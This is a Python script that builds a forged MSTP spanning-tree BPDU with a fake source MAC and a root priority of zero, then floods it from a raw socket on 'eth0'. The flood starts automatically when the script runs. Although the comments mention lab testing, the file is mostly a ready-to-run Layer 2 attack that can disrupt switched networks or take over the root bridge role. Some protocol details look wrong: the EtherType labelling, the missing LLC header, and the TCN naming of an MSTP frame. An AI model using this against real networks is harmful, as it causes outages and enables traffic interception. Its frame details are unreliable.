import socket
import time
import struct

# Network Interface to Send From
INTERFACE = "eth0"  # Change to your active interface

# Ethernet Frame Constants
DST_MAC = b'\x01\x80\xc2\x00\x00\x00'  # IEEE STP Multicast Address
SRC_MAC = b'\xaa\xbb\xcc\x00\x05\x00'  # Fake Source MAC Address
ETH_TYPE_STP = b'\x00\x26'  # STP EtherType

# MSTP BPDU Frame Components (Adjust for Lab Testing)
PROTOCOL_ID = b'\x00\x00'  # Spanning Tree Protocol Identifier
VERSION_ID = b'\x03'  # MSTP Version Identifier (3)
BPDU_TYPE = b'\x02'  # BPDU Type (MSTP)
BPDU_FLAGS = b'\x7C'  # Flags: Agreement, Forwarding, Learning, Designated Role

# Root and Bridge Identifiers (Change as Needed)
ROOT_ID = b'\x00\x00' + SRC_MAC  # Root Bridge Identifier
ROOT_PATH_COST = b'\x00\x00\x00\x00'  # Root Path Cost
BRIDGE_ID = b'\x00\x00' + SRC_MAC  # Bridge Identifier
PORT_ID = b'\x80\x03'  # Port Identifier (Port 3)
MESSAGE_AGE = b'\x00'  # Message Age
MAX_AGE = b'\x14'  # Max Age (20 seconds)
HELLO_TIME = b'\x02'  # Hello Time (2 seconds)
FORWARD_DELAY = b'\x0F'  # Forward Delay (15 seconds)
VERSION_1_LENGTH = b'\x00'  # Version 1 Length
VERSION_3_LENGTH = b'\x40'  # Version 3 Length

# MST Configuration
MST_CONFIG_ID = b'\x00'  # Format Selector
MST_CONFIG_NAME = b'SingleInstance'.ljust(
    32, b'\x00')  # Config Name (32 bytes)
MST_CONFIG_REVISION = b'\x00\x01'  # Config Revision
MST_CONFIG_DIGEST = b'\xe1\x3a\x80\xf1\x1e\xd0\x85\x6a\xcd\x4e\xe3\x47\x69\x41\xc7\x3b'  # Hash Digest
CIST_ROOT_PATH_COST = b'\x00\x00\x00\x00'  # Internal Root Path Cost
CIST_BRIDGE_ID = BRIDGE_ID  # CIST Bridge Identifier
CIST_REMAINING_HOPS = b'\x14'  # Remaining Hops (20)

# Construct MSTP BPDU Frame
STP_TCN_BPDU = (
    PROTOCOL_ID + VERSION_ID + BPDU_TYPE + BPDU_FLAGS +
    ROOT_ID + ROOT_PATH_COST + BRIDGE_ID + PORT_ID +
    MESSAGE_AGE + MAX_AGE + HELLO_TIME + FORWARD_DELAY +
    VERSION_1_LENGTH + VERSION_3_LENGTH +
    MST_CONFIG_ID + MST_CONFIG_NAME + MST_CONFIG_REVISION + MST_CONFIG_DIGEST +
    CIST_ROOT_PATH_COST + CIST_BRIDGE_ID + CIST_REMAINING_HOPS
)

# Construct Full Ethernet Frame
STP_FRAME = DST_MAC + SRC_MAC + ETH_TYPE_STP + STP_TCN_BPDU


def send_stp_flood(interface=INTERFACE, rate=10, duration=10):
    """
    Sends a flood of Spanning Tree Protocol (STP) TCN BPDUs.

    :param interface: Network interface to send from.
    :param rate: Packets per second.
    :param duration: Duration in seconds.
    """
    print(
        f"Sending MSTP TCN flood on {interface} at {rate} packets/sec for {duration} seconds.")

    # Create a raw socket for Layer 2 traffic
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((interface, 0))

    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(rate):
            sock.send(STP_FRAME)
        time.sleep(1)  # Control rate

    sock.close()
    print("STP flood complete.")


# Run the STP Flooding Script
send_stp_flood(interface="eth0", rate=100, duration=20)
